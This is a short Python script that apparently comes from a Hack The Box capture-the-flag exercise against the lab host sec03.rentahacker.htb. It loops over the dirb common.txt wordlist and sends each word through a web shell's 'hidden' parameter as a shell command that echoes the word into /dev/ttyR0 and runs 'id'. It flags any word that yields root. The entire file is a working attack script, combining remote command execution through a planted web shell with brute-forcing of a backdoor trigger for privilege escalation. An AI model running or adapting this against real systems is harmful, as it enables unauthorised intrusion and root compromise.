#!/usr/bin/python
from __future__ import print_function
import requests
import urllib

target = "http://sec03.rentahacker.htb/shell.php?hidden="
f = open('/usr/share/wordlists/dirb/common.txt', 'r')
magics = f.readlines()
f.close()

for m in magics:
    m = m.strip()
    cmd = "echo " + m + " > /dev/ttyR0; id"
    res = requests.get(target + urllib.quote(cmd))
    if "root" in res.content:
        print("Found: " + m)
